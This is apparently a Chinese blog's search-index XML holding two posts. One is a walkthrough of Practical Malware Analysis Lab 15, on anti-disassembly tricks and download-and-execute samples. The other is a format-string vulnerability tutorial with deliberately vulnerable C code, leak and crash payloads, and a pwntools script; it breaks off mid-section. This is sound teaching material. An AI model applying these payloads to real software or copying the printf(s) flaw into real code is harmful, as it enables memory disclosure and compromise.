<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验15</title>
    <link href="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/"/>
    <url>/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-15-1"><a href="#Lab-15-1" class="headerlink" title="Lab 15-1"></a>Lab 15-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，看到当前的代码，有几个红色的地方，此时已经被混淆过，让IDA的识别出现了问题。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-1.png"></p><p>按<code>D</code>将指令转为数据，然后跳过<code>E8</code>按<code>C</code>，重新构造代码，即可看到正确的汇编代码。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-2.png"></p><p>重新构造了汇编代码之后，分析一下程序的流程，首先是检查是否携带参数，这里注意下，<code>argc</code>默认是1，携带一个参数就是2，然后这里的<code>ebp+8</code>是<code>argc</code>参数稍微说明一下。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-3.png"></p><p>首先<code>main</code>有三个参数，<code>argc</code>，<code>argv</code>，<code>envp</code>，此时形成栈帧，那么当前栈的<code>ebp+4</code>就是返回地址，再下面就是压入栈的参数了，参数从右向左入栈，那么<code>ebp+8</code>就是<code>argc</code>。这里拿OD动调的来看一下，就明白了。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-4.png"></p><p>继续分析，如果参数不对的话，就会跳转到<code>0x40105E</code>处，这里是输出错误的情况</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-5.png"></p><p>然后是参数的比较，看到这里是<code>ebp+c</code>，刚才已经分析过了，这就是<code>main</code>函数的第二个参数<code>argv</code>，再看它赋值给<code>eax</code>之后，又是<code>eax+4</code>，这是<code>argv</code>是个数组，如果带参数的话，那么<code>argv[1]</code>才是参数。</p><p>看到这三处都是在比较参数的指定位置是否是指定的字符，也就是<code>pdq</code>，那么想要输出正确的条件，就需要输入参数<code>pdq</code>。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-6.png"></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/1-7.png"></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="1-这个二进制程序中使用了何种对抗反汇编技术？"><a href="#1-这个二进制程序中使用了何种对抗反汇编技术？" class="headerlink" title="1. 这个二进制程序中使用了何种对抗反汇编技术？"></a>1. 这个二进制程序中使用了何种对抗反汇编技术？</h4><p>通过在正确的语句前，加一个机器码<code>0xE8</code>，这是<code>call</code>指令的机器码，它会将后面的代码识别称为要<code>call</code>的地址，依次来欺骗反汇编。</p><h4 id="2-这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？"><a href="#2-这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？" class="headerlink" title="2. 这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？"></a>2. 这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？</h4><p><code>0xE8</code></p><h4 id="3-这种对抗反汇编技术被使用了多少次？"><a href="#3-这种对抗反汇编技术被使用了多少次？" class="headerlink" title="3. 这种对抗反汇编技术被使用了多少次？"></a>3. 这种对抗反汇编技术被使用了多少次？</h4><p>一共使用了5次</p><h4 id="4-什么命令行参数会让程序输出“Good-Job”？"><a href="#4-什么命令行参数会让程序输出“Good-Job”？" class="headerlink" title="4. 什么命令行参数会让程序输出“Good Job”？"></a>4. 什么命令行参数会让程序输出“Good Job”？</h4><p><code>pdq</code></p><h2 id="Lab-15-2"><a href="#Lab-15-2" class="headerlink" title="Lab 15-2"></a>Lab 15-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，看到部分的代码被识别成为了数据，重新识别一下。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-1.png"></p><p>发现混淆有<code>E8</code>、<code>E9</code>、<code>EB</code>这三个十六进制值，分别是<code>call</code>指令和<code>jmp</code>指令，分别对应的重新识别即可。</p><p>还有这个地方，实际上就是书中说的，一个字节用在了两个汇编指令之中。首先正常执行，会执行<code>mov     ax, 5EBh</code>、<code>xor     eax, eax</code>、<code>jz      short near ptr loc_4012E6+2</code>这三个语句此时注意这个跳转指令是跳到<code>loc_4012E6+2</code>这个地方，这里也就是<code>4012E8</code>，看IDA中并没有这个地址。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-2.png"></p><p>实际上这个地址的开始就是<code>EB</code>这个字节的开始，然后后面是<code>05</code>就是一个<code>jmp</code>指令了，第一次<code>EB</code>是作为<code>mov     ax, 5EBh</code>，中给<code>ax</code>赋值的值，第二次是作为跳转指令。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-3.png"></p><p>重新构造了指令之后，框选所有的代码，按下<code>P</code>即可重新创建函数，再按<code>F5</code>就可以查看伪代码。</p><p>看到整体的流程，在初始化网络之后，会获取<code>hostname</code>然后进行处理，主要是如果是字母<code>Z</code>会替换成<code>A</code>，如果是<code>z</code>会替换成<code>a</code>，如果是数字<code>9</code>会替换成<code>0</code>，其他的则会在原来<code>ascii</code>码的基础上加一。这个变化后的值会作为<code>USER-AGENT</code>，打开一个<code>URL</code>。读取网页内容，再其中搜索<code>Bamboo::</code>后的内容。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-4.png"></p><p>但是从<code>401216</code>到<code>401300</code>的代码并没有被翻译成伪代码，不知道为什么。这部分的内容尝试打开一个URL。<code>sub_40130F</code>是将exe的名字进行复制。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-5.png"></p><p>读取内容，然后创建一个叫Account Summary.xls.exe得文件，再将内容写入。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-6.png"></p><p>执行这个文件</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/2-7.png"></p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><h4 id="1-程序初始化请求的URL是什么？"><a href="#1-程序初始化请求的URL是什么？" class="headerlink" title="1. 程序初始化请求的URL是什么？"></a>1. 程序初始化请求的URL是什么？</h4><p><code>http://www.practicalmalwareanalysis.com/bamboo.html</code></p><h4 id="2-User-Agent域是如何产生的？"><a href="#2-User-Agent域是如何产生的？" class="headerlink" title="2. User-Agent域是如何产生的？"></a>2. User-Agent域是如何产生的？</h4><p>是通过<code>hostname</code>来通过一些改变来形成的。</p><h4 id="3-初始化请求时，程序在内存页中查找什么？"><a href="#3-初始化请求时，程序在内存页中查找什么？" class="headerlink" title="3. 初始化请求时，程序在内存页中查找什么？"></a>3. 初始化请求时，程序在内存页中查找什么？</h4><p>在查找<code>Bamboo::</code></p><h4 id="4-程序如何处理它从页中提取的信息？"><a href="#4-程序如何处理它从页中提取的信息？" class="headerlink" title="4. 程序如何处理它从页中提取的信息？"></a>4. 程序如何处理它从页中提取的信息？</h4><p>获取之后会再尝试打开一个URL，然后获取网页的信息写入Account Summary.xls.exe文件之中。</p><h2 id="Lab-15-3"><a href="#Lab-15-3" class="headerlink" title="Lab 15-3"></a>Lab 15-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序进行分析，看到是一个进程遍历的程序，它会遍历所有的进程，同时遍历进程的所有线程和模块。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-1.png"></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-2.png"></p><p>模块遍历</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-3.png"></p><p>线程遍历</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-4.png"></p><p><code>sub_4013D1</code>是一个出现错误的时候，提示错误的函数，调用<code>GetLastError</code>获取错误号，再打印出来。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-5.png"></p><p>函数刚开始就会修改返回地址，这里先将<code>0x400000</code>给<code>eax</code>，然后<code>or eax ，0x148C</code>此时eax等于<code>0x40148C</code>，这就是想要的返回地址，再写入到<code>[ebp+0x4]</code>这个地址之中，这就是原先返回值得地址。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-6.png"></p><p>在IDA中查看一下返回地址的函数，存在混淆。看到红色的地方，是<code>jmp</code>指令，那么大概又是通过跳转的混淆。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-7.png"></p><p>重新构造指令之后，查看，发现这段代码主要目的是构造一个结构化异常处理，看到框中的代码把自己的处理函数加入了<code>SEH</code>链中。然后通过<code>xor ecx,ecx</code>、<code>div ecx</code>这两条指令来触发异常。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-8.png"></p><p>继续查看这个函数，看到一些指令都没有被识别。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-9.png"></p><p>重新构造指令。首先会调用两次解密函数<code>sub_401534</code>，解密一些信息。然后下载资源到指定文件。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-10.png"></p><p>然后以隐藏方式启动这个文件</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-11.png"></p><p>加密的信息，前三行是第一个解密函数解密的信息，最后一行是第二个。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-12.png"></p><p>解密函数非常简单，就是一个取反的操作。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-13.png"></p><p>解密后的<code>URL</code></p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-14.png"></p><p>但是有一个问题，就是第二部分密文，没办法进行解密，因为解密函数判断要解密的第一个字节是不是0，但是要解密的信息，起始是<code>0x403040</code>，这里是0，所以导致没办法进行解密。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-15.png"></p><p>我们自己解密一下，看到是一个exe名称。</p><p><img src="/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/3-16.png"></p><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码怎样被初始化调用？"><a href="#1-恶意代码怎样被初始化调用？" class="headerlink" title="1. 恶意代码怎样被初始化调用？"></a>1. 恶意代码怎样被初始化调用？</h4><p>通过修改主函数的返回地址，在主函数返回的时候，进行调用。</p><h4 id="2-恶意代码都做了什么？"><a href="#2-恶意代码都做了什么？" class="headerlink" title="2. 恶意代码都做了什么？"></a>2. 恶意代码都做了什么？</h4><p>解密一个<code>URL</code>，在上面下载资源保存为spoolsrv.exe并且执行</p><h4 id="3-恶意代码使用了什么URL？"><a href="#3-恶意代码使用了什么URL？" class="headerlink" title="3. 恶意代码使用了什么URL？"></a>3. 恶意代码使用了什么URL？</h4><p><code>http://www.practicalmalwareanalysis.com/tt.html</code></p><h4 id="4-恶意代码使用了什么文件名？"><a href="#4-恶意代码使用了什么文件名？" class="headerlink" title="4. 恶意代码使用了什么文件名？"></a>4. 恶意代码使用了什么文件名？</h4><p><code>spoolsrv.exe</code></p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，可选</li></ul><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><p>scanf</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到stdout</td></tr><tr><td>fprintf</td><td>输出到指定FILE流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定的FILE流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr></tbody></table><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>首先来看一下关于<code>printf</code>函数，比如说如下语句</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>, <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-number">123456</span>, <span class="hljs-number">3.14</span>);<br></code></pre></div></td></tr></table></figure><p>当执行到printf前的栈情况是这样的，为了看起来更方便，用gdb调试查看。可以看到当前的栈情况，首先是<code>color  %s, number %d, float %4.2f</code>，然后是三个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png"></p><p>在进入<code>printf</code>之前，函数会首先获取第一个参数，一个一个读取字符会遇到两种情况。</p><ul><li>当前字符不是%，直接输出到相应标准输出。</li><li>当前字符是%，继续读取下一个字符，会有三种情况。</li></ul><ol><li>如果没有字符，报错；</li><li>如果下一个字符是%，输出%；</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出。</li></ol><p>假设前面的程序，语句修改成如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;color  %s, number %d, float %4.2f&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>此时，对于这个函数并没有提供参数，程序就会将栈上的三个变量分别解析为</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整型值</li><li>解析其内容对应的浮点数</li></ol><p>后面两个还好一点，但是对于第一个<code>%s</code>来说，如果提供了一个不可以访问的地址，那么程序就会崩溃，这就是格式化字符串漏洞的基本原理。</p><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>对于格式化字符串的漏洞利用主要是两个利用手段</p><ul><li>是程序崩溃，因为<code>%s</code>对应的参数地址不合法的概率较大。</li><li>查看进程内容，根据<code>%d</code>，<code>%f</code>输出了栈上的内容。</li></ul><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>对于程序崩溃来说，一般情况下这是最简单的利用方式，只需要连续输入若干个<code>%s</code>即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></div></td></tr></table></figure><p>具体的原理，在前面已经介绍过了。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串的漏洞，我们可以获取我们想要的输出的内容，一般有如下操作：</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，也可以获取其他libc函数地址</li><li>盲打，dump整个程序，获取有用信息</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>如下的程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先是可以利用格式化字符串来获取栈上的变量的数值。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png"></p><p>可以看到打印出来三个十六进制值，可以通过调试进一步查看。</p><p>可以看到输入<code>%08x.%08x.%08x</code>，打印出来三个栈上的值</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png"></p><p>如上的方法，是依次获得栈中的每个参数，也可以通过如下方法，获得指定的参数的值。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$x</span><br></code></pre></div></td></tr></table></figure><p>比如还是刚才的程序，输入<code>%3$x</code>，查看结果，看到输出了第三个参数的值，也就是栈上的第四个值。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png"></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还可以获得栈变量对应的字符串，只需要输入<code>%s</code>就可以了。</p><p>还是这个程序，输入<code>%s</code>查看结果。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png"></p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>刚才尝试了泄露栈上的连续变量，指定的变量，但还时没有能完全控制我们所要泄露的变量的地址。有时，可能需要泄露某一个<code>libc</code>函数的<code>got</code>表内容，从而得到其地址，进而获取<code>libc</code>版本以及其他函数的地址。</p><p>如果我们想要控制格式化字符串，我们就要知道该格式化字符串在输出函数调用的时候，用的是第几个参数，假设此时对应的是第n个参数，那么就可以通过如下方式获得某个指定地址addr的内容</p><p><code>addr%n$s</code></p><p>如何确定是第几个参数，就可以通过输入一长列%p来确定<code>[tag]%p%p%p%p%p%p...</code>。</p><p>还是拿之前的程序来做例子，输入<code>aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code></p><p>从图中可以看出，第四个位置是61616161，也就是我们输入的aaaa的ASCII码，那么现在可以确定是第四个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.png"></p><p>现在尝试获取以下<code>scanf</code>函数的地址，使用<code>pwntools</code>来构造<code>payload</code>。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./2&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./2&quot;</span>)<br>scanf = elf.got[<span class="hljs-string">&quot;__isoc99_scanf&quot;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(scanf)<br>payload = p32(scanf) + <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;%4$s\n&quot;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p>看到已经成功打印出了<code>scanf</code>函数的地址</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.png"></p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>刚才是通过格式化字符串来泄露栈内存以及任意地址的内存，现在来尝试修改任意地址变量的内存，只要变量对应的地址可写，就可以利用格式化字符串来修改其对应的数值。</p><p><code>%n</code>是不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>示例程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>一般需要构造的payload如下</p><figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">...<span class="hljs-selector-attr">[overwrite addr]</span>....%<span class="hljs-selector-attr">[overwrite 